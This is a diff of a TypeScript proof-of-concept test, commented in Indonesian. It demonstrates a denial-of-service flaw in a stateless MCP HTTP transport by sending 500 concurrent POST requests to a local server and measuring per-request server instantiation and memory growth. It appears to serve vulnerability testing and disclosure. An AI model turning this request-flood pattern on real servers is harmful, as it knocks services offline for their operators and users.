@@ -4,15 +4,16 @@ import http from 'node:http';
 import { StreamableHttpTransport } from '../../server/transport/streamable-http.js';
 import { getServer } from '../../server/server.js';
 
-// Mock fetch sederhana tanpa casting yang memicu error TS
+// Mock fetch untuk memantau berapa kali Mintlify dipanggil tanpa benar-benar keluar jaringan
 let mintlifyCallCount = 0;
 const originalFetch = global.fetch;
 
-global.fetch = async (url: string | URL | Request): Promise<Response> => {
+// PERBAIKAN: Tambahkan kurung '(' sebelum 'async' dan ')' sebelum 'as typeof fetch'
+global.fetch = (async (url: string | URL | Request, init?: RequestInit) => {
     const urlString = url.toString();
     if (urlString.includes('leaves.mintlify.com')) {
         mintlifyCallCount++;
-        // Simulasi delay jaringan agar efek concurrency dan memory buildup lebih akurat
+        // Simulasi delay jaringan agar efek concurrency lebih terasa
         await new Promise(resolve => setTimeout(resolve, 50));
         return new Response(JSON.stringify({
             name: 'mock',
@@ -20,9 +21,8 @@ global.fetch = async (url: string | URL | Request): Promise<Response> => {
             trieveApiKey: 'mock-key'
         }), { status: 200, headers: { 'Content-Type': 'application/json' } });
     }
-    // Fallback untuk fetch lain (seperti RPC URL jika ada)
-    return new Response('{}', { status: 200 });
-};
+    return originalFetch(url, init);
+}) as typeof fetch;
 
 describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
     let transport: StreamableHttpTransport;
@@ -33,11 +33,12 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
         // Inisialisasi transport streamable-http
         transport = new StreamableHttpTransport(0, 'localhost', '/mcp', 'disabled');
         
-        // @ts-ignore - Akses properti internal app untuk testing tanpa listen() port asli
+        // Karena kita tidak memanggil start() untuk menghindari binding port asli,
+        // kita inject app express secara manual untuk testing
+        // @ts-ignore - Akses internal app
         app = transport.app;
-        
-        // Fallback jika app tidak ter-expose secara internal
         if (!app) {
+            // Fallback jika app tidak ter-expose, buat manual mock app
             app = express();
             app.use(express.json());
             app.post('/mcp', async (req, res) => {
@@ -52,9 +53,7 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
                     await mcpServer.connect(httpTransport);
                     await httpTransport.handleRequest(req, res, req.body);
                 } catch (error) {
-                    if (!res.headersSent) {
-                        res.status(500).json({ error: 'Internal Server Error' });
-                    }
+                    res.status(500).json({ error: 'Internal Server Error' });
                 }
             });
         }
@@ -64,7 +63,6 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
 
     afterAll(() => {
         server.close();
-        // Restore fetch asli agar tidak mengganggu test lain
         global.fetch = originalFetch;
     });
 
@@ -82,28 +80,27 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
         // Catat memory sebelum serangan
         const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
         const initialMintlifyCalls = mintlifyCallCount;
-        console.log(`\n[Before Attack] Memory usage: ${memBefore.toFixed(2)} MB`);
+        console.log(`[Before Attack] Memory usage: ${memBefore.toFixed(2)} MB`);
 
         // Simulasi serangan DoS: 500 request concurrent
         const attackCount = 500;
-        console.log(`[Attack] Sending ${attackCount} concurrent requests to trigger getServer()...`);
+        console.log(`[Attack] Sending ${attackCount} concurrent requests to ${targetUrl}...`);
         
         const requests = [];
         for (let i = 0; i < attackCount; i++) {
+            // Kita tidak perlu peduli response berhasil atau gagal (Server Error 500 pun tidak masalah)
+            // Yang penting adalah handler getServer() tereksekusi
             requests.push(
                 fetch(targetUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
-                }).catch(() => {}) // Abaikan error (seperti ECONNRESET jika server crash)
+                }).catch(() => {}) // Abaikan error fetch (seperti ECONNRESET jika server crash)
             );
         }
 
-        // Tunggu semua request selesai/drop
+        // Tunggu semua request selesai (atau gagal karena server crash)
         await Promise.all(requests);
-
-        // Beri waktu GC sebentar untuk settle
-        await new Promise(resolve => setTimeout(resolve, 1000));
 
         // Catat memory setelah serangan
         const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;
@@ -111,12 +108,12 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
 
         console.log(`[After Attack] Memory usage: ${memAfter.toFixed(2)} MB`);
         console.log(`[Impact] Outbound calls to Mintlify triggered: ${totalMintlifyCalls}`);
-        console.log(`[Impact] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);
 
         // VERDICT: Jika getServer() dipanggil per request, mintlifyCallCount harusnya sama dengan attackCount
         expect(totalMintlifyCalls).toBe(attackCount);
         
-        // Verifikasi bahwa memori membengkak (indikasi object instantiation McpServer)
+        // Verifikasi bahwa memori membengkak signifikan (indikasi kebocoran object McpServer)
+        // Karena GC mungkin berjalan, kita hanya cek apakah ada peningkatan drastis
         expect(memAfter).toBeGreaterThan(memBefore);
     });
 });
